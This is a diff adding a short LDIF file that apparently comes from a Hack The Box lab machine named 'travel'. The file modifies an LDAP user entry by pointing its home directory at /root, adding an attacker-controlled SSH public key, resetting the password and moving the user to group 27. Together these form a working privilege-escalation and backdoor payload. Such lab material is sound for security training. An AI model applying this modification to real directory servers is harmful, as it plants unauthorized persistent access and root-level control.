@@ -1,0 +1,16 @@
+dn: uid=jerry,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+changetype: modify
+replace: homeDirectory
+homeDirectory: /root
+-
+add: objectClass
+objectClass: ldapPublicKey
+-
+add: sshPublicKey
+sshPublicKey: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSk6zuoPVc+U2KbwSOfOiN/kt279KxWnJ9vUDeYAM0GGK/yg+jCfH6yqNYaAswfCXgrssqKtOerQLWL0PjCDhXg3UADzyrVDZhgKx6t1a7Jj5/YVIUrWEUFmfl9KODxho7a3l2RT/zZXbUPZp+fQ5I280mh6Jiu3BdAUDEr19KQ3CPlKOctsTSVyPKH4Uue2LButAqelQp5LxTwhjYSXnvvZPpkbOr3cS0KQXGW7EE4Jqvi1osSm6RrbHN51slX6kX1YnKdfFKDukfYINlgaYKgpzouxbtn4g43FBRdmOMNEjAl6W7i9JhqB+ewyXgj7Szyjxm8fdZJ1nQtvFVwCIRS8w4ud90LBYqawCFzlGG8z4o4hs9Y+0X0n/aWDVMZZfJ3EEmgVPXEhapRmrNY5xeB9D/2Ncfd2XHlvCorw7/sFFCvF2+t+iFScGZ4ZCxAT0ymwJ3YAuHqtfaWTlhFRIaWhrOHPhdhHUthqNRi+M3ramOhY4/niMjnikYTi9ePJE= root@kali
+-
+replace: userPassword
+userPassword: wolf
+-
+replace: gidNumber
+gidNumber: 27
